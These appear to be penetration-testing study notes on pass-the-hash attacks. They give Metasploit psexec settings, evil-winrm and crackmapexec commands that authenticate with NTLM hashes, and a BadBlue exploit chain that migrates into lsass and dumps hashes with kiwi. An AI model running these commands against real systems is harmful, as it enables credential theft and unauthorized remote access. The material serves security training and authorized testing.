#### Pass-The-Hash Attacks
-> capturing or harvesting NTLM Hashes or clear passwords & utilize them to get the legitimate access.

##### Tools to access: 
- PsExec (msfconsole)
- evil-winrm
- crackmapexec
###### tools 
-> MSF `PsExec` Module
```
use exploit/windows/smb/psexec
set rhosts <targets_ip>
set lport 6969
set SMBUser Administrator
set SMBPass <LM:NTLM> # need both (LM and NTML togather and it shaparated my : )
run
```
For this exploit module we need `LM` and `NTLM` hash both which is separated by `:`
If this module gives us any error just change the target (set target )

--> `evil-winrm` for take remote access by Pass The Hash attack
```bash
evil-winrm -i 10.5.27.228 -u Administrator -H "5c4d59391f656d5958dab124ffeabc20"
```

-> `crackmapexec`
```bash
crackmapexec smb TARGET-IP -u username -H "HASH-VALUE" -x "command"
```
If we use `crackmapexec` we just only need `NTML` hash


##### Example of BadBlue Service
-> MSF : `badblue_passthru` exploit , set options , run , you'll get meterpreter shell.
-> `pgrep lsass` : get the lsass process ID
-> `migrate lsass` 
-> `getuid` : to check which user you are.
-> `load kiwi` : it loads kiwi , an alternative of mimikatz in MSF. enables you to more commands usefull to DUMP *hashes ,tickets & other creds*
	-> `lsa_dump_sam` / `hashdump`  : used to dump hashes

###### exploitation
-> now we have username and password hash
-> use these above mentioned tools